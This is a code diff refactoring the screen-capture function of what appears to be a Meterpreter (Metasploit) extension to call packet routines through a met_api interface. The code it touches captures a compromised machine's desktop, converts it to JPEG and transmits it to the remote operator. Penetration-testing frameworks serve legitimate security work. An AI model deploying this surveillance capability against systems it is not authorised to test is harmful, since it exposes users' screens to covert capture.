@@ -1,5 +1,5 @@
 #define _CRT_SECURE_NO_DEPRECATE 1
-#include "../../common/common.h"
+#include "common.h"
 #include <stdio.h>
 #include <windows.h>
 #include <tchar.h>
@@ -9,6 +9,7 @@
 #include <wingdi.h>
 #include "espia.h"
 #include "screen.h"
+#include "common_metapi.h"
 
 
 /* Function modified to store bitmap in memory. et [ ] metasploit.com 
@@ -827,7 +828,6 @@ int convert_bmp_and_send(HBITMAP hBmp, HDC hDC, Packet *resp){
 	memcpy(buf+sizeof(BITMAPFILEHEADER),(LPVOID) pbih, sizeof(BITMAPINFOHEADER)+ pbih->biClrUsed * sizeof (RGBQUAD));
 	memcpy(buf+sizeof(BITMAPFILEHEADER)+ (sizeof(BITMAPINFOHEADER)+ pbih->biClrUsed * sizeof (RGBQUAD)),(LPSTR) hp, (int) cb);
 	// Don't send it yet. Convert it to a JPEG.
-	//packet_add_tlv_raw(resp, TLV_TYPE_DEV_SCREEN, buf, s);
     
 
 	// JPEG conversion start here..'
@@ -875,7 +875,7 @@ int convert_bmp_and_send(HBITMAP hBmp, HDC hDC, Packet *resp){
 	(*src_mgr->finish_input) (&cinfo, src_mgr);
 	jpeg_finish_compress(&cinfo);
 	jpeg_destroy_compress(&cinfo);
-	packet_add_tlv_raw(resp, TLV_TYPE_DEV_SCREEN, buf_jpeg, buf_jpeg_size);
+	met_api->packet.add_tlv_raw(resp, TLV_TYPE_DEV_SCREEN, buf_jpeg, buf_jpeg_size);
 	// Is it safe to free this right after pack_add_tlv_raw? 
 	free(buf_jpeg);
 
@@ -896,7 +896,7 @@ int convert_bmp_and_send(HBITMAP hBmp, HDC hDC, Packet *resp){
  */
 DWORD request_image_get_dev_screen(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD dwResult             = ERROR_ACCESS_DENIED;
 	HWINSTA hWindowStation     = NULL;
 	HWINSTA hOrigWindowStation = NULL;
@@ -1045,7 +1045,7 @@ DWORD request_image_get_dev_screen(Remote *remote, Packet *packet)
 	if (hInputDesktop)
 		CloseDesktop(hInputDesktop);
 
-	packet_transmit_response(dwResult, remote, response);
+	met_api->packet.transmit_response(dwResult, remote, response);
 
 	return dwResult;
 }
